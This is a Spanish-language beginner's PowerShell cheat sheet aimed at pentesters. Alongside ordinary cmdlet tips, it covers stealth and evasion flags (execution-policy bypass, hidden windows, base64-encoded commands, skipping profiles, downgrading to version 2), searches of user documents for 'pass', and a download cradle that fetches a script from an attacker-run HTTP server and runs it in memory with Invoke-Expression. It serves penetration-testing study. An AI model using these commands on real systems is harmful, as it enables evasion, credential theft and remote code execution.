
Cheatsheet de newbie
/? ---> ayuda
"Get-Help" ----> como el man de linux, se puede agregar el flag -Examples para que te de ejemplos : "-Get-Help Get-Process -Examples" tambien puedes actualizar el get help con "Update-Help"
"Get-Command" ----> Te lista los comandos que matcheen el filtro : "Get-Command -Name *Firewall*" lista todos los comandos que tengan firewall en el nombre

COMANDO / ABREVIACION 
"-ExecutionPolicy Bypass" / "-ep Bypass" / "-ex by" ----> para omitir la politica de ejecucion del script que vayas a ejecutar, no aplica ninguna y directamente ejecuta el script
"-ExecutionPolicy Unrestricted" ----> parecido a bypass pero te da warnings y tal, mejor usar bypass y asi no te molesta 
"-WindowStyle Hidden" / "-Wi hi" / "-W h" ----> Para que el script/comando que ejecutas no abra una nueva ventana de powershell, ideal para probadores de bolis (pentesters)
"-Command comandoAEjecutar" ----> si quieres mas de uno, pues lo metes entre "", Ejemplo 'PowerShell -WindowStyle Hidden -Command Get-Process
"-EncodedCommand $encodedCommand" / "-enco" / "-ec"  ----> Ejecuta comandos o scripts encodeados en base64
"-NoProfile" ----> Asi no carga perfil de usuario y quizas puedes evadir alguna restriccion aplicada a ese usuario
"-Version X" ----> Si especificas la version al llamar al ejecutable de powershell, downgradeas la version a la que hayas especificado : "PowerShell -Version 2" 
"Select-Object X" ----> El output de un comando se considera "object" , cada tipo de output, por ejemplo Get-Process devuelve varias columnas, cada una de ellas se consideraria un objeto, si quieres filtrar puedes hacer una | y meterle un Select-Object NombreDeColumna 
"Format-List *" ----> Esto lo que hace es mostrar las propiedades del output de una manera legible, hay algunos objetos con un viaje de propiedades, asi puedes saber cual te interesa para filtrar, esta tambien Format-Table pero igual por el ancho dep antalla no muestra todas, mejor usar Format-List. 
                      Hay que tener en cuenta que si hay un monton de objetos, con un monton de propiedades, va a tardar un rato en listar
"Get-Alias -Defionition nombreDelComando" ----> Con esto vemos los alias asociados a un comando, no le veo mucha utilidad para el pentest pero bueno, si vemos que un comando es un coÃ±azo podemos ver si existe un alias (o crearlo...)

"Select-String -Path elPathDondeQueremosBUscar\*.txt -Pattern loQueEstamosBUscando" ----> Para filtrar los archivos de un directorio en funcion de su contenido : Select-Stirng -Path C:\users\user\Documents\*.txt -Pattern pass* 
"Get-Content" ----> el "cat" de linux de toda la vida
"$_" ----> Se refiere al objeto actual, esto se usa en bucles tipo for o for each para referirse al objeto con el que se esta trabajando en esa iteracion : ls -r | % {Get-Content _$}
"%" ----> esto significa ForEach del resultado, se usa sobre todo en pipes : "ls -r -File *.txt | % {Select-String -Path $_ -Pattern pass} 
"Get-Module" ----> Te lista todos los modulos IMPORTADOS disponibles
"Get-Module -ListAvailable" ----> Te lista todos los modulos IMPORTABLES 
"Get-Member -MemberType Method" ----> Esto, de los objetos del output te dice el tipo de objetos y los metodos para utilizar. Get-Process |Get-Member -MemberType Method

CREAR CLIENTE HTTP PARA HACER PETICIONES A UN SERVIDOR (POR EJEMPLO NUESTRO CLASICO python3 -m http.server 4444){

CON GUARDADO EN DISCO
$webclient = New-Object System.Net.WebClient
$url = "http://direccion_del_servidor:4444/nombre_del_archivo"
$destino = "C:\ruta\local\nombre_del_archivo"
$webclient.DownloadFile($url, $destino)


GUARDANDO DIRECTAMENTE EN MEMORIA 
$webclient = New-Object System.Net.WebClient
$contenido = $webclient.DownloadString('http://direccion_del_servidor:4444/nombre_del_archivo')
Invoke-Expression $contenido ---> para ejecutarlo si es un script



}



BAJANDO MODULO {

Te descargas el modulo

Te mueves a la carpeta donde se almacenan los modulos, la cual sabes cual es corriendo el comando "$Env:PSModulePAth"

Creas una carpeta con el nombre del modulo y copias todos los contenidos bajados dentro

Ya podemos hacer un Import-Module nombreDelModulo

Listamos comandos del modulo con Get-Command -Module nombreDelModulo

}
